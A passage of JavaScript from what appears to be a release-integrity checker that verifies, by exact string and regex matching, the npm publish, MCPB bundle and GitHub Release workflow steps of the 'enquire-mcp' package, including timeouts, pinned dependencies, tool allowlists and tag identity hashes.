  const npmPublishCwdGuardIndex = npmPublishRun.indexOf(
    '[ ! -d "$NPM_PUBLISH_CWD" ] || [ -L "$NPM_PUBLISH_CWD" ]',
    npmPublishCwdIndex
  );
  const npmNonfatalIndex = npmPublishRun.indexOf("set +e", npmPublishCwdGuardIndex);
  const npmPublishCdIndex = npmPublishRun.indexOf('cd "$NPM_PUBLISH_CWD" || exit 125', npmNonfatalIndex);
  const npmPublishIndex = npmPublishRun.indexOf(MCPB_EXACT_NPM_PUBLISH_RUN, npmPublishCdIndex);
  const npmExitCaptureIndex = npmPublishRun.indexOf("NPM_PUBLISH_EXIT=$?", npmPublishIndex);
  const npmFatalIndex = npmPublishRun.indexOf("set -e", npmExitCaptureIndex);
  const npmReadbackIndex = npmPublishRun.indexOf("for (( attempt=1; attempt<=12; attempt++ )); do", npmFatalIndex);
  const npmFinalTagIndex = npmPublishRun.indexOf("\nassert_remote_tag_identity", npmReadbackIndex);
  const npmTransactionOrderIsSafe =
    npmReserveIndex >= 0 &&
    npmPrewriteTagIndex > npmReserveIndex &&
    npmPrewriteReadIndex > npmPrewriteTagIndex &&
    npmRehashIndex > npmPrewriteReadIndex &&
    npmAttemptedIndex > npmRehashIndex &&
    npmPublishCwdIndex > npmAttemptedIndex &&
    npmPublishCwdGuardIndex > npmPublishCwdIndex &&
    npmNonfatalIndex > npmPublishCwdGuardIndex &&
    npmPublishCdIndex > npmNonfatalIndex &&
    npmPublishIndex > npmPublishCdIndex &&
    npmExitCaptureIndex > npmPublishIndex &&
    npmFatalIndex > npmExitCaptureIndex &&
    npmReadbackIndex > npmFatalIndex &&
    npmFinalTagIndex > npmReadbackIndex;
  const npmReserveTiming = exactPositiveIntegerCaptures(
    npmPublishRun,
    /require_job_reserve ([0-9]+) "npm publish"/gu,
    1
  );
  const npmTagReadLimit = exactPositiveIntegerCaptures(npmPublishRun, /local limit=([0-9]+)/gu, 1);
  const npmTagReadKill = exactPositiveIntegerCaptures(
    npmPublishRun,
    /"\$TIMEOUT_BIN" --kill-after=([0-9]+)s "\$\{limit\}s" "\$GH_BIN"/gu,
    1
  );
  const npmRegistryTiming = exactPositiveIntegerCaptures(
    npmPublishRun,
    /"\$TIMEOUT_BIN" --kill-after=([0-9]+)s ([0-9]+)s "\$CURL_BIN"/gu,
    2
  );
  const npmPublishTiming = exactPositiveIntegerCaptures(
    npmPublishRun,
    /"\$TIMEOUT_BIN" --kill-after=([0-9]+)s ([0-9]+)s "\$NPM_BIN" publish "\$PACKAGE_TARBALL"/gu,
    2
  );
  const npmReadbackTiming = exactPositiveIntegerCaptures(
    npmPublishRun,
    /for \(\( attempt=1; attempt<=([0-9]+); attempt\+\+ \)\); do/gu,
    1
  );
  const npmSleepTiming = exactPositiveIntegerCaptures(npmPublishRun, /^\s*sleep ([0-9]+)$/gmu, 1);
  const [npmReserveSeconds = 0] = npmReserveTiming ?? [];
  const [npmTagReadLimitSeconds = 0] = npmTagReadLimit ?? [];
  const [npmTagReadKillSeconds = 0] = npmTagReadKill ?? [];
  const [npmRegistryKillSeconds = 0, npmRegistryTimeoutSeconds = 0] = npmRegistryTiming ?? [];
  const [npmPublishKillSeconds = 0, npmPublishTimeoutSeconds = 0] = npmPublishTiming ?? [];
  const [npmReadbackAttempts = 0] = npmReadbackTiming ?? [];
  const [npmSleepSeconds = 0] = npmSleepTiming ?? [];
  const npmTimingContractIsExact =
    npmReserveTiming !== null &&
    npmTagReadLimit !== null &&
    npmTagReadKill !== null &&
    npmRegistryTiming !== null &&
    npmPublishTiming !== null &&
    npmReadbackTiming !== null &&
    npmSleepTiming !== null &&
    (npmPublishRun.match(/^\s*assert_remote_tag_identity$/gmu) ?? []).length === 2;
  const npmReserveCoversWorstCase =
    npmTimingContractIsExact &&
    npmReserveSeconds >=
      2 * 3 * (npmTagReadLimitSeconds + npmTagReadKillSeconds) +
        (npmRegistryTimeoutSeconds + npmRegistryKillSeconds) +
        (npmPublishTimeoutSeconds + npmPublishKillSeconds) +
        npmReadbackAttempts * (npmRegistryTimeoutSeconds + npmRegistryKillSeconds) +
        (npmReadbackAttempts - 1) * npmSleepSeconds +
        2700 +
        300;
  const npmPackPublishSurface = npmPublishRun
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /\bnpm (?:pack|publish)\b/u.test(line) || /\$NPM_BIN"?\s+(?:pack|publish)\b/u.test(line));
  const npmRegistryMutationCommands = npmPublishRun
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /^(?:(?:command|exec)\s+)?(?:npm|"\$NPM_BIN"|\$NPM_BIN)\s+(?:dist-tag|unpublish)\b/u.test(line));
  const npmPackPublishExpectedTail = [
    'echo "::error::npm pack did not produce exactly one canonical tarball"',
    'echo "::error::npm pack returned a divergent package name or version"',
    'echo "::error::npm pack returned a non-basename artifact path"',
    'echo "::error::npm pack tarball is missing, non-regular, or a symlink"',
    'echo "::error::npm pack metadata integrity differs from the canonical tarball bytes"',
    'require_job_reserve 4500 "npm publish"',
    'echo "::error::npm publish scratch directory is missing, non-directory, or a symlink"',
    MCPB_EXACT_NPM_PUBLISH_HEAD,
    'echo "::warning::npm publish exited $NPM_PUBLISH_EXIT, but exact tarball SRI, channel, and tag postconditions prove publication completed"'
  ];
  const npmCommandSurfaceIsClosed =
    npmPackPublishSurface.length === npmPackPublishExpectedTail.length + 1 &&
    npmPackPublishSurface[0]?.startsWith(`PACK_JSON=$(${MCPB_EXACT_NPM_PACK}`) === true &&
    npmPackPublishSurface[0]?.endsWith("\\") === true &&
    JSON.stringify(npmPackPublishSurface.slice(1)) === JSON.stringify(npmPackPublishExpectedTail) &&
    (npmPublishRun.match(/\bnpm\b/gu) ?? []).length === 33 &&
    (npmPublishRun.match(/\bNPM_BIN\b/gu) ?? []).length === 3;
  const npmPublicationIsByteBound =
    npmAssignmentLineCount("NPM_BIN") === 1 &&
    npmAssignmentLineCount("NODE_BIN") === 1 &&
    npmAssignmentLineCount("CURL_BIN") === 1 &&
    npmAssignmentLineCount("TAR_BIN") === 1 &&
    npmAssignmentLineCount("TIMEOUT_BIN") === 1 &&
    npmAssignmentLineCount("PACKAGE_TARBALL") === 1 &&
    npmAssignmentLineCount("NPM_CONFIG_USERCONFIG") === 2 &&
    npmAssignmentLineCount("NPM_PUBLISH_CWD") === 1 &&
    npmAssignmentLineCount("NPM_ENV_UNSETS") === 1 &&
    npmAssignmentLineCount("NPM_ENV_KEY_CANONICAL") === 2 &&
    npmPublishEnv?.NODE_AUTH_TOKEN === `\${{ secrets.NPM_TOKEN }}` &&
    npmPublishEnv?.NPM_CONFIG_REGISTRY === "https://registry.npmjs.org/" &&
    npmPublishEnv?.NPM_CONFIG_GLOBALCONFIG === "/dev/null" &&
    npmPublishEnv?.NPM_CONFIG_PROXY === "" &&
    npmPublishEnv?.NPM_CONFIG_HTTPS_PROXY === "" &&
    npmPublishEnv?.NPM_CONFIG_CAFILE === "" &&
    npmPublishEnv?.NPM_CONFIG_CA === "" &&
    npmPublishEnv?.NPM_CONFIG_STRICT_SSL === "true" &&
    npmPublishEnv?.NPM_CONFIG_FETCH_TIMEOUT === "60000" &&
    npmPublishEnv?.NPM_CONFIG_FETCH_RETRIES === "0" &&
    npmPublishRun.includes('PACKAGE_URL="https://registry.npmjs.org/%40oomkapwn%2Fenquire-mcp"') &&
    npmPublishRun.startsWith(
      `set -euo pipefail\n${LOWERCASE_PROXY_UNSET}\n${NPM_LOWERCASE_PIN_BLOCK}\n` +
        'GH_CONFIG_DIR=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-gh-config.XXXXXX")'
    ) &&
    mutationMatchCount(npmPublishRun, NPM_LOWERCASE_PIN_BLOCK) === 1 &&
    npmPublishRun.includes('NPM_CONFIG_USERCONFIG=$(/usr/bin/mktemp "$RUNNER_TEMP/enquire-npmrc.XXXXXX")') &&
    npmPublishRun.includes('npm_config_userconfig="$NPM_CONFIG_USERCONFIG"') &&
    npmPublishRun.includes("export NPM_CONFIG_USERCONFIG npm_config_userconfig") &&
    npmPublishRun.includes('chmod 600 "$NPM_CONFIG_USERCONFIG"') &&
    npmPublishRun.includes("'registry=https://registry.npmjs.org/'") &&
    npmPublishRun.includes(`'//registry.npmjs.org/:_authToken=\${NODE_AUTH_TOKEN}'`) &&
    mutationMatchCount(npmPublishRun, "NPM_ENV_UNSETS=()") === 1 &&
    npmPublishRun.includes("while IFS='=' read -r NPM_ENV_KEY _; do") &&
    npmPublishRun.includes(`NPM_ENV_KEY_CANONICAL=\${NPM_ENV_KEY,,}`) &&
    npmPublishRun.includes(`NPM_ENV_KEY_CANONICAL=\${NPM_ENV_KEY_CANONICAL//-/_}`) &&
    npmPublishRun.includes('case "$NPM_ENV_KEY_CANONICAL" in') &&
    mutationMatchCount(npmPublishRun, npmEnvPurgePattern) === 1 &&
    npmPublishRun.includes('NPM_ENV_UNSETS+=("--unset=$NPM_ENV_KEY")') &&
    npmPublishRun.includes("done < <(/usr/bin/env)") &&
    npmPublishRun.includes('PACKUMENT=$(mktemp "$RUNNER_TEMP/enquire-npm-packument.XXXXXX")') &&
    npmPublishRun.includes("registry_read() {") &&
    npmPublishRun.includes('"$TIMEOUT_BIN" --kill-after=5s 35s "$CURL_BIN"') &&
    npmPublishRun.includes("\"$CURL_BIN\" --disable --proxy ''") &&
    npmPublishRun.includes("--connect-timeout 10 --max-time 30 --max-filesize 67108864 --retry 0") &&
    npmPublishRun.includes("--proto '=https' --tlsv1.2") &&
    npmPublishRun.includes('--header "Accept: application/json" --header "Cache-Control: no-cache"') &&
    npmPublishRun.includes("--write-out '%{http_code}'") &&
    npmPublishRun.includes('[ "$request_exit" -ne 0 ] || [ "$status" != "200" ]') &&
    !npmPublishRun.includes("application/vnd.npm.install-v1+json") &&
    npmPublishRun.includes("npm_snapshot() {") &&
    npmPublishRun.includes(".name != $package") &&
    npmPublishRun.includes("(.versions | has($version))") &&
    npmPublishRun.includes('(."dist-tags" | has($channel)) as $channelPresent') &&
    npmPublishRun.includes('($channelPresent and ($channelVersion == "-"))') &&
    npmPublishRun.includes('gitHead: (if ($published | has("gitHead")) then $published.gitHead else null end)') &&
    npmPublishRun.includes("integrity: $published.dist.integrity") &&
    mutationMatchCount(npmPublishRun, NPM_RESERVE_DEADLINE_GUARD) === 1 &&
    !npmPublishRun.includes("npm view ") &&
    (npmPublishRun.match(/registry_read\(\) \{/g) ?? []).length === 1 &&
    (npmPublishRun.match(/if ! registry_read; then/g) ?? []).length === 2 &&
    (npmPublishRun.match(/if registry_read && NPM_POST_STATE=\$\(npm_snapshot\); then/g) ?? []).length === 1 &&
    (npmPublishRun.match(/"\$NPM_BIN" pack --json/g) ?? []).length === 1 &&
    npmPublishRun.includes(MCPB_EXACT_NPM_PACK) &&
    npmPublishRun.includes('--pack-destination "$RUNNER_TEMP"') &&
    npmPublishRun.includes('PACKAGE_TARBALL="$RUNNER_TEMP/$PACK_BASENAME"') &&
    npmPublishRun.includes('[ ! -f "$PACKAGE_TARBALL" ] || [ -L "$PACKAGE_TARBALL" ]') &&
    npmPublishRun.includes('PACK_MANIFEST_COUNT=$("$TIMEOUT_BIN" --kill-after=5s 30s "$TAR_BIN" -tzf') &&
    npmPublishRun.includes('$0 == "package/package.json" { count++ }') &&
    npmPublishRun.includes('[ "$PACK_MANIFEST_COUNT" -ne 1 ]') &&
    npmPublishRun.includes("package/package.json)") &&
    npmPublishRun.includes('[ "$PACKED_NAME" != "$PACKAGE_NAME" ] || [ "$PACKED_VERSION" != "$VERSION" ]') &&
    npmPublishRun.includes("REPORTED_INTEGRITY=$(printf '%s' \"$PACK_JSON\" | jq -er") &&
    npmPublishRun.includes('.[0].integrity | select(type == "string" and test("^sha512-') &&
    npmPublishRun.includes(MCPB_NPM_TARBALL_SRI) &&
    (npmPublishRun.match(/tarball_sri "\$PACKAGE_TARBALL"/g) ?? []).length === 2 &&
    npmPublishRun.includes('[ "$REPORTED_INTEGRITY" != "$EXPECTED_INTEGRITY" ]') &&
    npmPublishRun.includes('[ "$PRE_PUBLISH_INTEGRITY" != "$EXPECTED_INTEGRITY" ]') &&
    npmPublishRun.split(npmStateInvocation).length - 1 === 3 &&
    mutationMatchCount(npmPublishRun, MCPB_EXACT_NPM_PUBLISH_RUN) === 1 &&
    npmPublishRun.includes('NPM_PUBLISH_CWD=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-npm-publish.XXXXXX")') &&
    npmPublishRun.includes('[ ! -d "$NPM_PUBLISH_CWD" ] || [ -L "$NPM_PUBLISH_CWD" ]') &&
    npmPublishRun.includes('cd "$NPM_PUBLISH_CWD" || exit 125') &&
    npmRegistryMutationCommands.length === 0 &&
    npmPublishRun.includes("NPM_PUBLISH_ATTEMPTED=true") &&
    npmPublishRun.includes("NPM_PUBLISH_EXIT=$?") &&
    npmPublishRun.includes("npm exact SRI/channel state did not converge after 12 bounded reads") &&
    npmPublishRun.includes("exact tarball SRI, channel, and tag postconditions prove publication completed") &&
    npmCommandSurfaceIsClosed &&
    npmTransactionOrderIsSafe &&
    npmReserveCoversWorstCase;
  if (
    JSON.stringify(toolNames) !== JSON.stringify(BASIC_MCPB_TOOLS) ||
    JSON.stringify(manifest.prompts) !== "[]" ||
    manifest.tools_generated !== false ||
    manifest.prompts_generated !== false
  ) {
    problems.push("MCPB Basic must expose exactly 13 approved read-only tools and zero prompts");
  }
  const expectedPrefix = [
    `\${__dirname}/server/dist/index.js`,
    "serve",
    "--vault",
    `\${user_config.vault}`,
    "--no-prompts",
    "--no-embedding-index",
    "--diagnostic-search-tools",
    "--enabled-tools"
  ];
  if (
    JSON.stringify(args.slice(0, expectedPrefix.length)) !== JSON.stringify(expectedPrefix) ||
    JSON.stringify(args.slice(expectedPrefix.length).sort()) !== JSON.stringify(BASIC_MCPB_TOOLS) ||
    args.some((arg) => /--enable-write|--feedback-weight|--watch|--persistent-index|--include-pdfs/.test(arg))
  ) {
    problems.push("MCPB launch args must be the exact fail-closed Basic allowlist");
  }
  if (
    (inputs.cli.match(/\.option\("--no-prompts", PROMPTS_HELP\)/g) ?? []).length !== 2 ||
    (inputs.cli.match(/\.option\("--no-embedding-index", EMBEDDING_INDEX_HELP\)/g) ?? []).length !== 2 ||
    !inputs.cliHelp.includes("export const PROMPTS_HELP") ||
    !inputs.cliHelp.includes("export const EMBEDDING_INDEX_HELP") ||
    !inputs.server.includes("if (opts.prompts !== false) registerPrompts(server);") ||
    !inputs.server.includes("const embeddingIndexEnabled = opts.embeddingIndex !== false") ||
    !inputs.server.includes("opts.embeddingIndex === false") ||
    !inputs.docsApi.includes("| `--no-prompts`") ||
    !inputs.docsApi.includes("| `--no-embedding-index`")
  ) {
    problems.push("Basic isolation flags must be shared by stdio/HTTP, documented, and preserve full defaults");
  }
  const devDependencies = yamlRecord(pkg.devDependencies);
  if (devDependencies?.["@anthropic-ai/mcpb"] !== "2.1.2" || devDependencies?.fflate !== "0.8.3") {
    problems.push("MCPB packer and archive verifier dependencies must be exact-pinned");
  }
  const overrides = yamlRecord(pkg.overrides);
  const lockPackages = yamlRecord(lock.packages);
  const lockedTmp = yamlRecord(lockPackages?.["node_modules/tmp"]);
  if (overrides?.tmp !== "0.2.7" || lockedTmp?.version !== "0.2.7" || lockPackages?.["node_modules/os-tmpdir"]) {
    problems.push("MCPB dev graph must override tmp to patched 0.2.7 without the orphaned legacy helper");
  }
  const scripts = yamlRecord(pkg.scripts);
  if (
    !inputs.versionCheck.includes('new URL("../mcpb/manifest.json"') ||
    !inputs.versionCheck.includes('"mcpb/manifest.json:version"') ||
    !inputs.versionSync.includes('path.join(repoRoot, "mcpb", "manifest.json")') ||
    !inputs.versionSync.includes("mcpbManifest.version = version") ||
    !String(scripts?.version ?? "").includes("server.json mcpb/manifest.json")
  ) {
    problems.push("version lifecycle must synchronize and stage all eight published version surfaces");
  }
  if (
    !inputs.build.includes('export const MCPB_PACKER_VERSION = "2.1.2"') ||
    !inputs.build.includes('export const MCPB_SPEC_COMMIT = "70fe3b34cd6dff1b3bba046638edc72a6467a4fb"') ||
    !inputs.build.includes('"--omit=dev"') ||
    !inputs.build.includes('"--omit=optional"') ||
    !inputs.build.includes('"--ignore-scripts"') ||
    !inputs.build.includes('"--no-bin-links"') ||
    !inputs.build.includes("content-manifest.json") ||
    !inputs.build.includes("inventoryPackedArchive(DRAFT_ARTIFACT)") ||
    !inputs.build.includes('[packerCli, "pack", STAGE, DRAFT_ARTIFACT]') ||
    !inputs.build.includes("archive bytes include upstream pack-time mtime") ||
    !inputs.build.includes('[packerCli, "pack", STAGE, artifact]') ||
    !inputs.build.includes('writeFileSync(path.join(STAGE, "sbom.cdx.json")') ||
    !inputs.build.includes('writeFileSync(path.join(STAGE, "third-party-licenses.json")') ||
    !inputs.build.includes("scanInstalledPackages") ||
    !inputs.build.includes("resolveRequiredDependencyRefs") ||
    !inputs.build.includes("nativeBinaryReason") ||
    !inputs.build.includes("STAGE_OWNER_CONTENT") ||
    !inputs.build.includes("lstatSync") ||
    !inputs.build.includes("MCPB staging target already exists; refusing recursive cleanup") ||
    !inputs.build.includes("MCPB output already exists; refusing overwrite") ||
    !inputs.build.includes("portableArchivePath") ||
    (!inputs.build.includes("Windows-reserved") && !inputs.build.includes("non-portable archive path")) ||
    !inputs.build.includes('"@hono/node-server": pkg.overrides?.["@hono/node-server"]') ||
    !inputs.build.includes("hono: pkg.overrides?.hono")
  ) {
    problems.push(
      "MCPB builder must pin upstream, omit unsafe feature deps, two-pass inventory official bytes, ship transparency records, and guard owned cleanup"
    );
  }
  if (
    !inputs.consumer.includes('from "@modelcontextprotocol/client"') ||
    !inputs.consumer.includes('from "@modelcontextprotocol/client/stdio"') ||
    !inputs.consumer.includes('resource.uri === "obsidian://vault/info"') ||
    !inputs.consumer.includes("templates.resourceTemplates.map((template) => template.uriTemplate)") ||
    !inputs.consumer.includes('["obsidian://note/{+notePath}"]') ||
    !inputs.consumer.includes("optional dependency leaked") ||
    !inputs.consumer.includes('entries.get("sbom.cdx.json")') ||
    !inputs.consumer.includes('entries.get("third-party-licenses.json")') ||
    !inputs.consumer.includes("license inventory misses installed packages") ||
    !inputs.consumer.includes("content inventory sidecar differs from bundled inventory") ||
    !inputs.consumer.includes("SBOM sidecar differs from bundled SBOM") ||
    !inputs.consumer.includes("SCRATCH_MARKER") ||
    !inputs.consumer.includes("scratch identity changed") ||
    !inputs.consumer.includes("ownership token changed") ||
    !inputs.consumer.includes('from "./lib/mcpb-safety.mjs"') ||
    !inputs.consumer.includes("portableArchiveKey") ||
    !inputs.consumer.includes("MCPB-outside-vault-canary-must-never-leak") ||
    !inputs.consumer.includes("traversal must be explicitly refused") ||
    !inputs.consumer.includes("positive consumer calls must cover every Basic tool exactly once") ||
    !inputs.consumer.includes("Basic session changed vault paths, physical identities, bytes, modes, or timestamps") ||
    !inputs.consumer.includes('manifest.user_config.vault.type, "directory"') ||
    !inputs.consumer.includes("dev: stat.dev") ||
    !inputs.consumer.includes("ino: stat.ino") ||
    !inputs.consumer.includes("ctime_ms: stat.ctimeMs") ||
    !inputs.consumer.includes("canaryBefore") ||
    !inputs.consumer.includes("outside-vault canary identity changed") ||
    !inputs.consumer.includes("live tool is not annotated read-only") ||
    !inputs.consumer.includes("optional dependency identity leaked") ||
    !inputs.consumer.includes("nativeBinaryReason") ||
    !inputs.consumer.includes("native executable leaked into Basic MCPB") ||
    !inputs.consumer.includes('"@hono/node-server": "^2.0.11"') ||
    !inputs.consumer.includes('hono: "^4.12.34"') ||
    !inputs.consumer.includes('archivedPackageVersions.get("@hono/node-server")') ||
    !inputs.consumer.includes('["2.0.11"]') ||
    !inputs.consumer.includes('archivedPackageVersions.get("hono")') ||
    !inputs.consumer.includes('["4.12.34"]') ||
    !inputs.consumer.includes("stranded embedding index and activation guard") ||
    !inputs.consumer.includes("Basic session changed isolated cache sentinel paths") ||
    !inputs.consumer.includes("XDG_CACHE_HOME") ||
    !inputs.consumer.includes(MCPB_HYBRID_POSITIVE_ASSERTION) ||
    !inputs.consumer.includes(MCPB_HYBRID_ABSENT_QUERY) ||
    !inputs.consumer.includes(MCPB_HYBRID_NEGATIVE_ASSERTION) ||
    !inputs.consumer.includes(MCPB_HYBRID_FALSE_HIT_ASSERTION) ||
    !inputs.consumer.includes("server died after negative controls")
  ) {
    problems.push(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
  }
  const assetPhaseIndex = inputs.release.indexOf("- name: Upload Basic MCPB asset, checksum, and provenance");
  const visibilityPollIndex = inputs.release.indexOf(MCPB_RELEASE_VISIBILITY_POLL);
  const visibilityRefreshIndex = inputs.release.indexOf(MCPB_RELEASE_VISIBILITY_REFRESH, visibilityPollIndex);
  const visibilityCountIndex = inputs.release.indexOf("RELEASE_COUNT=$(printf", visibilityRefreshIndex);
  const visibilityDuplicateIndex = inputs.release.indexOf(
    MCPB_RELEASE_VISIBILITY_DUPLICATE_GUARD,
    visibilityCountIndex
  );
  const visibilityBreakIndex = inputs.release.indexOf(
    'if [ "$RELEASE_COUNT" -eq 1 ]; then break; fi',
    visibilityDuplicateIndex
  );
  const visibilityTimeoutIndex = inputs.release.indexOf(MCPB_RELEASE_VISIBILITY_TIMEOUT_GUARD, visibilityBreakIndex);
  const visibilityWaitIndex = inputs.release.indexOf(MCPB_RELEASE_VISIBILITY_WAIT, visibilityTimeoutIndex);
  const visibilityDoneIndex = inputs.release.indexOf("          done", visibilityWaitIndex);
  const assetReleaseJsonIndex = inputs.release.indexOf("RELEASE_JSON=$(printf", visibilityDoneIndex);
  const visibilityPollIsSafe =
    assetPhaseIndex >= 0 &&
    visibilityPollIndex > assetPhaseIndex &&
    visibilityRefreshIndex > visibilityPollIndex &&
    visibilityCountIndex > visibilityRefreshIndex &&
    visibilityDuplicateIndex > visibilityCountIndex &&
    visibilityBreakIndex > visibilityDuplicateIndex &&
    visibilityTimeoutIndex > visibilityBreakIndex &&
    visibilityWaitIndex > visibilityTimeoutIndex &&
    visibilityDoneIndex > visibilityWaitIndex &&
    assetReleaseJsonIndex > visibilityDoneIndex;
  const remoteTagIdentityStepNames = [
    "Preflight existing GitHub release and every Basic asset before npm",
    "Publish with provenance or verify an exact prior publication",
    "Prepare draft GitHub Release",
    "Upload Basic MCPB asset, checksum, and provenance",
    MCP_REGISTRY_STEP_NAME
  ];
  const remoteTagIdentityExpectedCalls = [1, 2, 3, 7, 5];
  const remoteTagIdentityMarker = "assert_remote_tag_identity() {";
  const remoteTagIdentityRuns = remoteTagIdentityStepNames.map((name) =>
    name === "Upload Basic MCPB asset, checksum, and provenance"
      ? releaseTransactionFixture
      : runBody(namedStep(releaseSteps, name))
  );
  const remoteTagIdentityBodies = remoteTagIdentityRuns.map((body) => {
    if (mutationMatchCount(body, remoteTagIdentityMarker) !== 1) return "";
    const start = body.indexOf(remoteTagIdentityMarker);
    const end = body.indexOf("\n}", start + remoteTagIdentityMarker.length);
    const endLineBreak = end < 0 ? -1 : body.indexOf("\n", end + 2);
    const endLineEnd = endLineBreak < 0 ? body.length : endLineBreak;
    if (end < 0 || body.slice(end + 2, endLineEnd).length !== 0) return "";
    return start >= 0 && end > start ? body.slice(start, end + 2) : "";
  });
  const canonicalRemoteTagIdentityBody = remoteTagIdentityBodies[0] ?? "";
  const remoteTagIdentityIsCanonical =
    canonicalRemoteTagIdentityBody.length > 0 &&
    remoteTagIdentityBodies.every((body) => body === canonicalRemoteTagIdentityBody) &&
    remoteTagIdentityRuns.every((body, index) => {
      const expectedCalls = remoteTagIdentityExpectedCalls[index];
      return (
        expectedCalls !== undefined &&
        (body.match(/^[ \t]*assert_remote_tag_identity[ \t]*$/gmu) ?? []).length === expectedCalls &&
        mutationMatchCount(body, "assert_remote_tag_identity") === expectedCalls + 1
      );
    }) &&
    createHash("sha256").update(canonicalRemoteTagIdentityBody, "utf8").digest("hex") ===
      "1c4171ada2237d39b1bcbd02a23ce69a6db4ed3843421d865ebb8795b7bdba76";
  if (
    !releaseTransactionIsPinned ||
    inputs.release.includes("npm run mcpb:build") ||
    !inputs.release.includes("Download exact CI-gated Basic MCPB release asset") ||
    !inputs.release.includes("actions: read") ||
    inputs.release.includes("checks: read") ||
    !inputs.release.includes('node-version: "22.13.0"') ||
    !inputs.release.includes(
      "actions/workflows/ci.yml/runs?branch=main&event=push&head_sha=$SOURCE_SHA&per_page=100"
    ) ||
    inputs.release.includes("--status success") ||
    !inputs.integrity.includes("export function evaluateNpmPublication") ||
    !inputs.integrity.includes("expected npm source SHA must be one exact lowercase SHA-1") ||
    !inputs.integrity.includes("isCanonicalSha512Sri") ||
    !inputs.integrity.includes('decoded.toString("base64") === encoded') ||
    !inputs.integrity.includes("expected npm tarball integrity must be one canonical SHA-512 SRI") ||
    !inputs.integrity.includes('Object.hasOwn(state, "gitHead")') ||
    !inputs.integrity.includes("state.gitHead !== null && !isExactSha1(state.gitHead)") ||
    !inputs.integrity.includes("state.integrity !== expectedIntegrity") ||
    !inputs.integrity.includes("evaluateNpmPublication(payload, first, second, process.argv[5], process.argv[6])") ||
    !inputs.integrity.includes("export function evaluateMcpbReleaseState") ||
    !inputs.integrity.includes("export function evaluateConvergentCount") ||
    !inputs.integrity.includes("export function evaluateReleaseChecks") ||
    !inputs.integrity.includes("export function flattenPaginatedArrays") ||
    !inputs.integrity.includes("export function flattenPaginatedField") ||
    !inputs.integrity.includes('workflowRun.name !== "CI"') ||
    !inputs.integrity.includes('workflowRun.path !== ".github/workflows/ci.yml"') ||
    !inputs.integrity.includes("job.run_id !== trustedRun.id") ||
    !inputs.integrity.includes("job.run_attempt > trustedRun.run_attempt") ||
    !inputs.integrity.includes("duplicate required CI job in exact workflow-run attempt") ||
    !inputs.integrity.includes("Number.isSafeInteger(value)") ||
    !inputs.integrity.includes("GitHub release state must explicitly contain release and assets") ||
    !inputs.integrity.includes("release.name !== expected.name") ||
    !inputs.integrity.includes("release.body !== expected.body") ||
    !inputs.integrity.includes("name: process.env.EXPECTED_RELEASE_NAME") ||
    !inputs.integrity.includes("body: process.env.EXPECTED_RELEASE_BODY") ||
    !inputs.integrity.includes("isExactSha256DigestOrNull") ||
    !inputs.integrity.includes("paginated asset element has an invalid identity") ||
    !inputs.integrity.includes("export function candidateRunIds") ||
    !inputs.integrity.includes("export function evaluateMcpbCandidateRun") ||
    !inputs.integrity.includes("export function assertMcpbAssetVersion") ||
    !inputs.integrity.includes("export function assertChannelVersionAdvance") ||
    !inputs.integrity.includes('asset.state !== "uploaded"') ||
    !inputs.integrity.includes('asset.content_type !== "application/octet-stream"') ||
    !inputs.integrity.includes("asset.size <= 0") ||
    !inputs.integrity.includes("/^sha256:[0-9a-f]{64}$/u.test(asset.digest)") ||
    !inputs.integrity.includes('if (prerelease !== "true" && prerelease !== "false")') ||
    inputs.integrity.includes("release.target_commitish") ||
    !inputs.release.includes('node scripts/check-release-integrity.mjs asset-version "$VERSION"') ||
    !inputs.release.includes("node scripts/check-release-integrity.mjs candidate-runs") ||
    !inputs.release.includes('candidate "$SOURCE_SHA"') ||
    !inputs.release.includes("{workflow_run: $workflow_run, jobs: $jobs, artifacts: $artifacts}") ||
    !/node scripts\/check-release-integrity\.mjs \\\s+candidate/u.test(inputs.release) ||
    (inputs.release.match(/node scripts\/check-release-integrity\.mjs release-state/g) ?? []).length !== 3 ||
    (inputs.release.match(/release-state "\$TAG" "\$EXPECTED_PRERELEASE"/g) ?? []).length !== 3 ||
    (inputs.release.match(/EXPECTED_RELEASE_NAME="\$TAG" EXPECTED_RELEASE_BODY="\$NOTES"/g) ?? []).length !== 3 ||
    (inputs.release.match(/NOTES=\$\(awk -v heading="## \[\$VERSION\] — "/g) ?? []).length !== 3 ||
    inputs.release.includes('release-state "$TAG" "$SOURCE_SHA"') ||
    !inputs.release.includes("build_artifact_id:") ||
    !inputs.release.includes("build_artifact_digest:") ||
    !inputs.release.includes("build_run_attempt:") ||
    !inputs.release.includes('echo "build_run_attempt=$PINNED_RUN_ATTEMPT" >> "$GITHUB_OUTPUT"') ||
    !inputs.release.includes('echo "artifact_id=$PINNED_ARTIFACT_ID" >> "$GITHUB_OUTPUT"') ||
    !inputs.release.includes('echo "artifact_digest=$PINNED_ARTIFACT_DIGEST" >> "$GITHUB_OUTPUT"') ||
    !inputs.release.includes("actions/runs/$CANDIDATE_RUN_ID/jobs?filter=all&per_page=100") ||
    !inputs.release.includes("actions/runs/$CANDIDATE_RUN_ID/artifacts?per_page=100") ||
    !inputs.release.includes("CI_RUN_PAGES=$(gh_read api --paginate --slurp") ||
    !inputs.release.includes("\n          RUN_PAGES=$(gh_read api --paginate --slurp") ||
    !inputs.release.includes("JOB_PAGES=$(gh_read api --paginate --slurp") ||
    !inputs.release.includes("ARTIFACT_PAGES=$(gh_read api --paginate --slurp") ||
    !inputs.release.includes(MCPB_ACTIONS_ARTIFACT_DOWNLOAD) ||
    !inputs.release.includes('ACTUAL_ARTIFACT_DIGEST="sha256:$(sha256sum "$CANDIDATE_ZIP"') ||
    !inputs.release.includes("Downloaded Actions artifact digest differs from the selected API identity") ||
    !visibilityPollIsSafe ||
    !inputs.release.includes(MCPB_RELEASE_VISIBILITY_POLL_WITH_REFRESH) ||
    !inputs.release.includes('import { portableArchivePath } from "./scripts/lib/mcpb-safety.mjs"') ||
    !inputs.release.includes('echo "build_run_id=$CI_RUN_ID" >> "$GITHUB_OUTPUT"') ||
    !inputs.release.includes('CI_RUN_ID=""') ||
    !inputs.release.includes('PROVENANCE_RUN_ID=""') ||
    !inputs.release.includes(`"\${PINNED_RUN_ATTEMPT:--}"`) ||
    !inputs.release.includes('"$CANDIDATE_RUN_ID" != "$PROVENANCE_RUN_ID"') ||
